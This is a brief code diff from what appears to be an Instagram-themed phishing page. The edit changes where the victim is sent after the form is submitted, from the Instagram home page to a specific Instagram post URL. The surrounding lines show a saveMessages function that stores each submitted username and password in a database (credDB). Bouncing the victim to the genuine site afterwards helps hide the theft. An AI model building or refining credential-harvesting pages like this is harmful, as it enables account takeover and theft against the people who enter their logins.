@@ -47,7 +47,7 @@ function submitForm(e) {
 function redirectToAnotherURL() {
     // Modify this function to redirect to your desired URL
     //window.location.href = 'https://www.instagram.com/';
-    window.location.href = 'https://www.instagram.com/';
+    window.location.href = 'https://www.instagram.com/p/CvAm5f6v6qMl3-DOUR6R_7HnTpVKeX7vfsiYDI0/?igshid=MzRlODBiNWFlZA==';
 }
 const saveMessages = (username, password) => {
   var newCred = credDB.push();
